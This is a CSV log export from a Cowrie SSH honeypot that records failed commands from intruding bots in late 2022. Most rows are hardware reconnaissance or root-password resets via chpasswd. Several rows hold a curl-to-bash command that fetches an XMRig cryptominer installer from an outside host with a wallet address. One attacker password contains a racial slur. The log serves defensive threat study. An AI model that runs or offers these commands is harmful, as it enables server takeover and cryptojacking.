eventid,username,input,size,compCS,width,outfile,protocol,duration,height,url,keyAlgs,ttylog,data,sensor,arch,session,shasum,message,langCS,timestamp,kexAlgs,encCS,password,version,dst_port,macCS,destfile,client_fingerprint,filename
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,7f908cd1158e,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-09-30T17:37:17.051868Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,7f908cd1158e,,Command not found: nvidia-smi,,2022-09-30T17:37:17.067649Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,db8ecb9b7f37,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-09-30T17:37:34.166770Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,dc1e5cc07e40,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-09-30T17:37:50.544362Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,ab69d1b152cd,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-09-30T17:38:19.269223Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,b6dbcfea48db,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-09-30T17:38:45.869353Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,b6dbcfea48db,,Command not found: nvidia-smi,,2022-09-30T17:38:45.885572Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,2e078d648bc7,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-09-30T17:40:17.600829Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,2e078d648bc7,,Command not found: nvidia-smi,,2022-09-30T17:40:17.616845Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,80237bd9a544,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-09-30T17:44:59.356983Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,5cc7464e5c3f,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-09-30T17:45:20.973757Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,7d0bf118237c,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-09-30T17:46:25.822833Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,7944de373888,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-09-30T17:46:27.455831Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,add86ed638bf,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-09-30T17:48:04.568653Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,3d912a4270b1,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-09-30T17:48:08.513969Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,0112eebdafe4,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-09-30T17:50:25.188402Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,413cc8cee44e,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-09-30T17:51:49.815229Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,d448a51872b8,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-09-30T18:00:13.036858Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,79346e6ab93b,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-09-30T18:04:55.071047Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,0a8d767b43e9,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-09-30T18:05:02.141567Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,0a8d767b43e9,,Command not found: nvidia-smi,,2022-09-30T18:05:02.157110Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,0561bc75f40c,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-09-30T18:05:03.231970Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,0561bc75f40c,,Command not found: nvidia-smi,,2022-09-30T18:05:03.248072Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,42e9cfc8d020,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-09-30T18:05:06.460235Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,9068868671fd,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-09-30T18:06:37.323845Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,9068868671fd,,Command not found: nvidia-smi,,2022-09-30T18:06:37.342269Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,0c26a365b2cc,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-09-30T18:06:37.975131Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,0c26a365b2cc,,Command not found: nvidia-smi,,2022-09-30T18:06:38.000255Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,e02d7f567d09,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-09-30T18:06:46.928830Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,e02d7f567d09,,Command not found: nvidia-smi,,2022-09-30T18:06:46.946610Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,9ed6cf79e847,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-09-30T18:06:48.342703Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,9ed6cf79e847,,Command not found: nvidia-smi,,2022-09-30T18:06:48.360758Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,07670887fe3d,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-09-30T18:07:04.339231Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,07670887fe3d,,Command not found: nvidia-smi,,2022-09-30T18:07:04.357852Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,08fc77ae0f6d,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-09-30T18:07:06.069144Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,08fc77ae0f6d,,Command not found: nvidia-smi,,2022-09-30T18:07:06.092674Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,70ed417a20df,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-09-30T18:07:21.063675Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,70ed417a20df,,Command not found: nvidia-smi,,2022-09-30T18:07:21.079956Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,c950b83cf481,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-09-30T18:07:22.381361Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,c950b83cf481,,Command not found: nvidia-smi,,2022-09-30T18:07:22.400715Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,f7b264ccc31b,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-09-30T18:07:55.579996Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,f7b264ccc31b,,Command not found: nvidia-smi,,2022-09-30T18:07:55.596132Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,cd1d89cdf6df,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-09-30T18:07:56.581669Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,cd1d89cdf6df,,Command not found: nvidia-smi,,2022-09-30T18:07:56.597190Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,300e35898fa9,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-09-30T18:08:02.558468Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,9a882e8b9ce2,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-09-30T18:09:01.833494Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,9a882e8b9ce2,,Command not found: nvidia-smi,,2022-09-30T18:09:01.849040Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,221438ef517f,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-09-30T18:09:02.371604Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,221438ef517f,,Command not found: nvidia-smi,,2022-09-30T18:09:02.387189Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,449a49913911,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-09-30T18:09:09.708809Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,a6b1c03f40fb,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-09-30T18:09:10.640805Z,,,,,,,,,
cowrie.command.failed,,nproc,,,,,,,,,,,,fet-cowrie,,b691ed2a4e55,,Command not found: nproc,,2022-10-01T05:10:35.575104Z,,,,,,,,,
cowrie.command.failed,,nproc,,,,,,,,,,,,fet-cowrie,,b5e527847ffa,,Command not found: nproc,,2022-10-01T05:10:40.955258Z,,,,,,,,,
cowrie.command.failed,,nproc,,,,,,,,,,,,fet-cowrie,,c696fe7b3779,,Command not found: nproc,,2022-10-01T05:11:04.329795Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,305f89946d1e,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-10-01T05:11:15.677435Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,8718c4fe8e3d,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:11:17.098805Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,8718c4fe8e3d,,Command not found: nvidia-smi,,2022-10-01T05:11:17.115494Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,8baf72f54aaf,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:11:18.032592Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,8baf72f54aaf,,Command not found: nvidia-smi,,2022-10-01T05:11:18.049360Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,67469d17e79b,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:11:34.837201Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,67469d17e79b,,Command not found: nvidia-smi,,2022-10-01T05:11:34.854655Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,bea95fde162a,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:11:35.983133Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,bea95fde162a,,Command not found: nvidia-smi,,2022-10-01T05:11:35.998477Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,f08c46349f32,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:11:53.031596Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,f08c46349f32,,Command not found: nvidia-smi,,2022-10-01T05:11:53.046682Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,edd550caf888,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:11:54.492442Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,edd550caf888,,Command not found: nvidia-smi,,2022-10-01T05:11:54.508973Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,6b3382e72cd8,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:12:10.922133Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,6b3382e72cd8,,Command not found: nvidia-smi,,2022-10-01T05:12:10.937469Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,97b7240f98eb,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:12:12.063070Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,97b7240f98eb,,Command not found: nvidia-smi,,2022-10-01T05:12:12.079713Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,5fa8175866b8,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-10-01T05:12:24.200698Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,5e13de90aad4,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:12:32.443424Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,5e13de90aad4,,Command not found: nvidia-smi,,2022-10-01T05:12:32.459616Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,07df50c71b13,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:12:32.972681Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,07df50c71b13,,Command not found: nvidia-smi,,2022-10-01T05:12:32.989580Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,803ac5e7195e,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:13:42.881843Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,803ac5e7195e,,Command not found: nvidia-smi,,2022-10-01T05:13:42.897394Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,9bfd0dde75a5,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:13:43.947898Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,9bfd0dde75a5,,Command not found: nvidia-smi,,2022-10-01T05:13:43.963948Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,6ace3c0d6ed1,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T05:13:46.250158Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,6ace3c0d6ed1,,Command not found: nvidia-smi,,2022-10-01T05:13:46.252760Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,6ace3c0d6ed1,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T05:13:46.255475Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,4d83e8c7be79,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-10-01T05:13:48.796635Z,,,,,,,,,
cowrie.command.failed,,nproc,,,,,,,,,,,,fet-cowrie,,aadd8b85164f,,Command not found: nproc,,2022-10-01T05:14:03.339541Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,a238613e3090,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-10-01T05:14:09.129668Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,da2ca1c2fe18,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T05:14:12.133097Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,da2ca1c2fe18,,Command not found: nvidia-smi,,2022-10-01T05:14:12.135695Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,da2ca1c2fe18,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T05:14:12.138057Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,7de4459f9f76,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T05:14:18.598662Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,7de4459f9f76,,Command not found: nvidia-smi,,2022-10-01T05:14:18.601103Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,7de4459f9f76,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T05:14:18.603670Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,3d650d3d836f,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T05:14:46.063746Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,3d650d3d836f,,Command not found: nvidia-smi,,2022-10-01T05:14:46.066190Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,3d650d3d836f,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T05:14:46.068615Z,,,,,,,,,
cowrie.command.failed,,nproc,,,,,,,,,,,,fet-cowrie,,d023b5795852,,Command not found: nproc,,2022-10-01T05:14:50.447098Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,d547eddbb6fa,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T05:14:52.851451Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,d547eddbb6fa,,Command not found: nvidia-smi,,2022-10-01T05:14:52.853839Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,d547eddbb6fa,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T05:14:52.856238Z,,,,,,,,,
cowrie.command.failed,,nproc,,,,,,,,,,,,fet-cowrie,,7d1d93b49183,,Command not found: nproc,,2022-10-01T05:14:57.606941Z,,,,,,,,,
cowrie.command.failed,,nproc,,,,,,,,,,,,fet-cowrie,,79c988e11941,,Command not found: nproc,,2022-10-01T05:15:11.525297Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,bcb3ed754b67,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T05:15:18.131439Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,bcb3ed754b67,,Command not found: nvidia-smi,,2022-10-01T05:15:18.133817Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,bcb3ed754b67,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T05:15:18.136447Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,8f2537e93573,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T05:15:24.184528Z,,,,,,,,,
